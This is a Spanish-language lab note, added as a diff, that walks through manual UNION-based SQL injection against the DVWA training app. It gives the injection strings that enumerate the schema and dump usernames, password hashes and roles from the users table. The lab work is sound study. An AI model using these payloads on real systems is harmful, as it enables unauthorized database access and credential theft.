@@ -1,0 +1,41 @@
+---
+layout: apunte
+title: "1. Breaking the Logging Form"
+---
+
+Vamos a intentar una inyección SQL manual aprovechndo que esta es vista (hay otra Blind para más adelante).
+
+!**Pasted image 20251204121001.png**
+
+--------------------------------------------
+1. Vamos a introducir una consulta "válida".
+   !**Pasted image 20251204121253.png**
+2. Recibimos esta respuesta.
+   !**Pasted image 20251204121418.png**
+   La URL queda tal que así:
+   !**Pasted image 20251204122131.png**
+   Por lo tanto sabemos que mínimo hay tres campos, que son los que nos está mostrando la web.
+3. Sabemos qu ees vulnerable a SQLI porque si metemos una comilla nos da error 500.
+   !**Pasted image 20251204122328.png**
+4. Vamos a hacer un ejercicio para ver cuántas columnas hay.
+	1. Empezamos con `1' UNION SELECT 1,2,3-- -` que sabemos que es válido, pues mínimo hay 3 campos basándonos en el output de antes.
+	   !**Pasted image 20251204124300.png**
+	   Parece ser que hemos errado en nuestra suposición. Estudiaremos por qué.
+	2. Vamos a probar con el `1' UNION SELECT 1,2-- -`.
+	   !**Pasted image 20251204124351.png**
+	   Parece que ahora si que hemos obtenido información relevante.
+5. Para obtener información sobre la base de datos, empezaremos a sustituir y en lugar del 1, pondremos la query que queramos ver.
+	1. Empezamos sustituyendo el 1 por `database()`:  `1' UNION SELECT database(),2-- -`.
+	   !**Pasted image 20251204124647.png**
+	   Ahí podemos ver que el nombre de la base de datos es `dvwa`.
+	2. Seguimos indagando en el nombre de las tablas con: `1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa'-- -`.
+	   !**Pasted image 20251204163630.png**
+	   Parece que nos puede interesar la tabla "users".
+	3. Vamos a sacar el nombre de las columnas con la query: `1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'-- -`.
+	   !**Pasted image 20251204164241.png**
+	   Los campos que más nos interesan a priori son `user` y `password`. Y el de `role` puede estar interesante para diferenciar posibles admins sin tener que mirar el nombre.
+	4. Los extraemos con la query: `1' UNION SELECT 1,group_concat(user,':',password,':',role SEPARATOR '<br>') FROM users -- -`.
+	   !**Pasted image 20251204164608.png**
+
+>[!SUCCESS] Hemos conseguido vulnerar la base de datos y obtener nombre, contraseña y rol de todos los usuarios registrados en ella.
+
